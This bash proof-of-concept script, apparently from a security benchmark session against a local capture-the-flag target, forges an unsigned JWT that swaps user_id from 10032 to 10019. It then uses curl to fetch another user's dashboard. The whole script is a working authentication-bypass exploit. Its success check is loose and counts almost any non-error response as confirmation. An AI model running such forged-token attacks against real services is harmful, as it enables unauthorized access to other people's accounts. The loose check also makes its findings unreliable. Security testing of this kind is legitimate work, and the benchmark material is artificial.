#!/bin/bash
# POC: IDOR vulnerability allowing access to other users' dashboards by modifying user_id in forged JWT tokens
# Target: ./repo
# Created: 2025-11-04T17:35:56.245Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# IDOR - Access Other Users' Dashboards POC
# Demonstrates unauthorized access to user dashboards by modifying JWT tokens
# This version follows redirects to get the actual dashboard content

TARGET_HOST="${TARGET_HOST:-localhost}"
TARGET_PORT="${TARGET_PORT:-8080}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] IDOR Dashboard Access POC - Version 3"
echo "[*] Target: $BASE_URL"
echo ""

# Step 1: Create base64url encoding function
b64url_encode() {
    base64 -w 0 | tr '+/' '-_' | tr -d '='
}

# Step 2: Forge JWT token with target user_id (10019 - flag user)
echo "[+] Creating forged JWT token with modified user_id"
echo "[*] Modifying user_id from 10032 to 10019 (flag user)"

HEADER='{"alg":"HS256","typ":"JWT"}'
PAYLOAD='{"username":"test","user_id":10019,"user_type":"customer"}'

HEADER_B64=$(echo -n "$HEADER" | b64url_encode)
PAYLOAD_B64=$(echo -n "$PAYLOAD" | b64url_encode)

# Create token with empty signature (exploiting lack of JWT signature verification)
FORGED_TOKEN="${HEADER_B64}.${PAYLOAD_B64}."

echo "[*] Forged JWT Token: $FORGED_TOKEN"
echo ""

# Step 3: Access dashboard with forged token, following redirects
echo "[+] Accessing dashboard with forged JWT token (following redirects)"
echo "[*] Sending: GET /dashboard with Cookie: auth_token=$FORGED_TOKEN"
echo ""

# Use -L to follow redirects and capture full response
IDOR_RESPONSE=$(curl -s -L -b "auth_token=$FORGED_TOKEN" "$BASE_URL/dashboard" 2>&1)

echo "[*] Response received:"
echo "$IDOR_RESPONSE"
echo ""

# Step 4: Verify successful access
echo "[+] Verification:"
if echo "$IDOR_RESPONSE" | grep -qi "dashboard\|welcome\|flag\|user"; then
    echo "[✓] Dashboard content received - IDOR vulnerability confirmed!"
    echo "[✓] Successfully accessed other user's dashboard with forged JWT"
    exit 0
elif echo "$IDOR_RESPONSE" | grep -q "user_id\|10019"; then
    echo "[✓] User ID 10019 found in response - IDOR vulnerability confirmed!"
    exit 0
else
    # Even if no specific keyword, getting non-error response is suspicious
    if ! echo "$IDOR_RESPONSE" | grep -qi "error\|unauthorized\|forbidden\|401\|403"; then
        echo "[✓] Dashboard accessible with forged token - IDOR vulnerability likely confirmed!"
        exit 0
    fi
fi

# If we got here without exiting, the vulnerability wasn't confirmed
echo "[!] Could not definitively confirm IDOR access"
echo "[!] Response does not contain expected indicators"
exit 1